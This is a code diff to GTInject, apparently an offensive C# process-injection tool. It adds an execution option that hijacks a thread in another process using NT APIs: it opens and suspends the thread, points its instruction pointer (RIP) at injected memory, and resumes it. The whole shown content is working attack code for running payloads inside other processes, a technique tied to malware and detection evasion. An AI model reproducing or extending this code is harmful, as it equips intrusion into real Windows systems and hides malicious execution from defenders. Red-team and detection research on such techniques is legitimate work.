@@ -10,6 +10,7 @@ using GTInject.SysCalls;
 using System.Linq.Expressions;
 using static GTInject.SysCalls.WinNative;
 using System.Security.Cryptography;
+using System.Runtime.Remoting.Contexts;
 
 namespace GTInject.Injection
 {
@@ -31,6 +32,8 @@ namespace GTInject.Injection
                     return execopt201(memaddr, pid, tid);
                 case 202:
                     return execopt202(memaddr, pid, tid);
+                case 203:
+                    return execopt203(memaddr, pid, tid);
                 case 300:
                     return execopt300(memaddr, pid, tid);
                 case 301:
@@ -256,6 +259,59 @@ namespace GTInject.Injection
                 return targetThread; // returning an IntPtr, threadhandle is already an IntPtr
             }
         }
+
+
+        private static IntPtr execopt203(IntPtr memaddr, Process ProcID, int ThreadID)
+        {
+            /////////////////////////////////////
+            // OPTION 203 == GetThreadContext - SetThreadContext "Thread Hijacking" (NTAPI)
+            /////////////////////////////////////
+            // Enum the LAST thread ID in a remote process and use that to hijack? Assuming earlier thread creation has a potential to be a 'main thread' and don't want to crash teh process
+            // At WINAPI level, we can do this natively in C#, consider alternative methods for NT and syscall levels
+
+            if (ThreadID == 0)
+            {
+                // Find the 2nd last thread ID, the user hasn't selected their own
+                var threadObjects = ProcID.Threads;
+                ThreadID = threadObjects[threadObjects.Count - 2].Id;
+                Console.WriteLine("[+] Found a Thread to hijack " + ThreadID);
+            }
+            else
+            {
+                // Use the users thread Id for injection
+                Console.WriteLine("[+] Using your thread ID to hijack TID " + ThreadID);
+            }
+
+            CONTEXT64 contextObj = new CONTEXT64();
+            contextObj.ContextFlags = CONTEXT_FLAGS.CONTEXT_FULL;
+
+            var targetThread = IntPtr.Zero;
+            var cid = new CLIENT_ID { UniqueThread = (IntPtr)ThreadID };
+            OBJECT_ATTRIBUTES objAttributes = new OBJECT_ATTRIBUTES();
+            var NtOpenTResp = NtOpenThread(out targetThread, (uint)ThreadAccessRights.AllAccess, ref objAttributes, ref cid); 
+            
+            Console.WriteLine("     Opened handle as thread handle = " + targetThread + ". Suspending now.. ");
+            ulong prevSusCount = 999;
+            var resp = NtSuspendThread( targetThread, out prevSusCount);
+            Console.WriteLine("     NtSuspend response {0} with previous suspend count {1}", resp, prevSusCount);
+
+
+            resp = NtGetContextThread(targetThread, ref contextObj);
+            contextObj.Rip = (ulong)memaddr;
+            Console.WriteLine("     NtGetContextThread response {0} and RIP set to {1}", resp, contextObj.Rip);
+
+            resp = NtSetContextThread(targetThread, ref contextObj);
+            Console.WriteLine("     NtSetContextThread response {0}", resp);
+
+            var ntResTResp = NtResumeThread(targetThread, 0);
+            Console.WriteLine("     NtResumethread response " + ntResTResp);
+            return IntPtr.Zero;
+
+
+        }
+
+
+
         private static IntPtr execopt300(IntPtr memaddr, Process ProcID, int ThreadID)
         {
             /////////////////////////////////////
